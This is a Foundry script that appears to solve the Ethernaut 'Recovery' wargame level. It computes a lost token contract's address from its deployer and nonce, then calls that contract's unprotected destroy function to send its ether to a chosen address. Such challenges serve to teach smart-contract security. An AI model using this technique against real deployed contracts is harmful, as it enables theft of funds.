// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Recovery.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract RecoverySolution is Script {
    SimpleToken st =
        SimpleToken(payable(0x99a31E0E2ae6c800e12d3e723C2aa7fF66382cD0));
    Recovery recovery = Recovery(0xB5c686ab60008F1CAEa87c87Fbbb6274D0E64340);

    function run() external {
        vm.startBroadcast();
        st.destroy(payable(0xeDc3e3588a5F0bf61c9A6B4ad1e573942d729e16));
        vm.stopBroadcast();
        // console.logAddress(
        //     address(
        //         uint160(
        //             uint256(
        //                 keccak256(
        //                     abi.encodePacked(
        //                         bytes1(uint8(0xc0 + 22)),
        //                         bytes1(uint8(0x80 + 20)),
        //                         bytes20(address(recovery)),
        //                         bytes1(uint8(0x01))
        //                     )
        //                 )
        //             )
        //         )
        //     )
        // );
    }
}
